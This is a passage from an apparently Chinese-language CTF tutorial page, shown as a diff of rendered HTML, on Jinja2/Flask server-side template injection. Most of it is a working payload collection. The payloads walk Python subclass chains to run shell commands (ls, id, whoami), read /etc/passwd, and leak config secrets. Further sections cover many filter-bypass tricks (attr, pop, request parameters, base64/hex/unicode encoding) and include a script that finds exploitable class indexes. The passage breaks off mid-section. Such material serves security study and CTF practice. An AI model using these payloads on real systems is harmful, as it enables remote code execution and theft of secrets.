+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;commands&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">getstatusoutput</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="姿势集">姿势集
+</h2><h3 id="config">config
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{config}} 可以获取当前设置，如果题目是这样的：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）
+</span></span><span class="line"><span class="cl">可以直接访问 {{config[&#39;FLAG&#39;]}} 或者 {{config.FLAG}} 得到 flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="bp">self</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">_TemplateReference__context</span><span class="o">.</span><span class="n">config</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="heading">[]、()
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">68</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="全局变量">全局变量
+</h3><p>url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等</p>
+<p>如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">FLAG</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="vm">__self__</span><span class="o">.</span><span class="n">_get_data_for_json</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;json&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">JSONEncoder</span><span class="o">.</span><span class="n">default</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过滤了-">过滤了 []、.
+</h3><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。</p>
+<p>若.也被过滤，使用原生 JinJa2 函数 |attr()</p>
+<p>即将 request.<strong>class</strong> 改成 request|attr(&quot;<strong>class</strong>&quot;)</p>
+<h3 id="过滤__">过滤__
+</h3><p>利用 request.args 的属性</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">mro</span><span class="p">][</span><span class="mi">2</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span><span class="err">?</span><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。</p>
+<p>GET:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">class</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">mro</span><span class="p">][</span><span class="mi">2</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">value</span><span class="o">.</span><span class="n">subclasses</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POST:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">class</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">subclasses</span><span class="o">=</span><span class="n">__subclasses__</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过滤">过滤&quot;&quot;
+</h3><p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="err">?</span><span class="n">path</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="一些关键字被过滤">一些关键字被过滤
+</h3><h4 id="base64编码绕过">base64编码绕过
+</h4><p>用于__getattribute__使用实例访问属性时。</p>
+<p>例如，过滤掉 <strong>class</strong> 关键词</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;X19jbGFzc19f&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="字符串拼接绕过"><strong>字符串拼接绕过</strong>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__c&#39;</span><span class="o">+</span><span class="s1">&#39;lass__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[]</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">([</span><span class="s1">&#39;__c&#39;</span><span class="p">,</span><span class="s1">&#39;lass__&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">]}}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="查类脚本">查类脚本
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将查找到的父类列表替换到data中</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, ......]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span>
+</span></span><span class="line"><span class="cl"><span class="n">userful_class</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;linecache&#39;</span><span class="p">,</span> <span class="s1">&#39;os._wrap_close&#39;</span><span class="p">,</span> <span class="s1">&#39;subprocess.Popen&#39;</span><span class="p">,</span> <span class="s1">&#39;warnings.catch_warnings&#39;</span><span class="p">,</span> <span class="s1">&#39;_frozen_importlib._ModuleLock&#39;</span><span class="p">,</span> <span class="s1">&#39;_frozen_importlib._DummyModuleLock&#39;</span><span class="p">,</span> <span class="s1">&#39;_frozen_importlib._ModuleLockManager&#39;</span><span class="p">,</span> <span class="s1">&#39;_frozen_importlib.ModuleSpec&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;&#39;(.*?)&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">class_list</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">class_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">userful_class</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">class_list</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&#34;: &#34;</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="进阶办法">进阶办法
+</h2><p>上面内置函数还是讲的不够清楚</p>
+<p>flask提供了两个内置的全局函数：<code>url_for、get_flashed_messages</code>，两个都有<code>__globals__</code>键；</p>
+<p>jinja2一共有3个内置的全局函数：<code>range、lipsum、dict</code>，其中只有lipsum有<code>__globals__</code>键</p>
+<p>flask的内置函数只有flask的渲染方法render_template()和render_template_string()渲染时才可使用；</p>
+<p>jinja2的内置函数无条件，flask和jinja2的渲染方法都可使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># flask
+</span></span><span class="line"><span class="cl">{{get_flashed_messages.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
+</span></span><span class="line"><span class="cl">{{url_for.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
+</span></span><span class="line"><span class="cl"># jinja2
+</span></span><span class="line"><span class="cl">{{lipsum.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
+</span></span><span class="line"><span class="cl"># 另外两个内置函数和正常逃逸一个思路
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="内置类-undefined">内置类 Undefined
+</h3><p>在渲染<code>().__class__.__base__.__subclasses__().c.__init__</code>初始化一个类时，此处由于不存在c类理论上应该报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了<strong>Undefined</strong>类型，渲染结果显示为``，所以看起来并不存在的c类实际上触发了内置的<strong>Undefined</strong>类型。</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a.__init__.__globals__.__builtins__.open(&#34;C:\Windows\win.ini&#34;).read()
+</span></span><span class="line"><span class="cl">a.__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bytes">bytes
+</h3><p>python3新增了bytes类，用于代表字符串，其fromhex()方法可以将十六进制转换为字符串。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># &#34;&#34;[__class__]
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;&#34;.encode().fromhex(&#34;5f5f636c6173735f5f&#34;).decode()]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bypass">bypass
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 字符串拼接
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;__cl&#34;+&#34;ass__&#34;]
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;__cl&#34;&#34;ass__&#34;]
+</span></span><span class="line"><span class="cl"># 字符串倒序
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;__ssalc__&#34;[::-1]]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="符号绕过">符号绕过
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 绕过.
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#39;__class__&#39;]
+</span></span><span class="line"><span class="cl">&#39;&#39;|attr(&#39;__class__&#39;)
+</span></span><span class="line"><span class="cl"># 绕过[]
+</span></span><span class="line"><span class="cl">__subclasses__().pop(40) == __subclasses__()[40]
+</span></span><span class="line"><span class="cl">__subclasses__().__getitem__(40) == __subclasses__()[40]
+</span></span><span class="line"><span class="cl"># 绕过\{\{
+</span></span><span class="line"><span class="cl">{%print()%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;)}}{% endif %}{% endfor %}
+</span></span><span class="line"><span class="cl"># 也可以使用 {% if ... %}1{% endif %} 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）出来：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{% if &#39;&#39;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls /&#39;) %}1{% endif %}
+</span></span><span class="line"><span class="cl"># 也可以用 {%print(......)%} 的形式来代替 {{ ，如下：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{%print(&#39;&#39;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="编码绕过">编码绕过
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 以下皆为 &#34;&#34;[&#34;__class__&#34;] 等效形式
+</span></span><span class="line"><span class="cl"># 八进制
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;\137\137\143\154\141\163\163\137\137&#34;]
+</span></span><span class="line"><span class="cl"># 十六进制
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#34;]
+</span></span><span class="line"><span class="cl"># Unicode
+</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#34;]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="通用绕过">通用绕过
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%print 123%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先检测有ssti</p>
+<h3 id="获取__globals__">获取<code>__globals__</code>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取globals
+</span></span><span class="line"><span class="cl">{%set globals=dict(globals=a)|join%}{%print globals%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取下划线
+</span></span><span class="line"><span class="cl">{%print lipsum|string|list%}
+</span></span><span class="line"><span class="cl">获取pop方法
+</span></span><span class="line"><span class="cl">我们知道从哪里获取下划线之后，但是要考虑如何使用索引值来获取，这时我们就想到了pop()方法。pop()方法可以通过传入列表元素的索引值将列表中的该元素删除并返回该元素的值。
+</span></span><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}{%print pop%}
+</span></span><span class="line"><span class="cl">这样的话我们就可以获取到下划线了。
+</span></span><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%print xiahuaxian%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取下划线之后也就自然能获得__globals__。
+</span></span><span class="line"><span class="cl">{%set pop=dict(po=a,p=b)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%set globals=dict(globals=a)|join%}{%print(xiahuaxian,xiahuaxian,globals,xiahuaxian,xiahuaxian)|join%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="获取os模块">获取os模块
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取os字符串
+</span></span><span class="line"><span class="cl">{%set shell=dict(o=a,s=b)|join%}{%print shell%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">获取get()方法
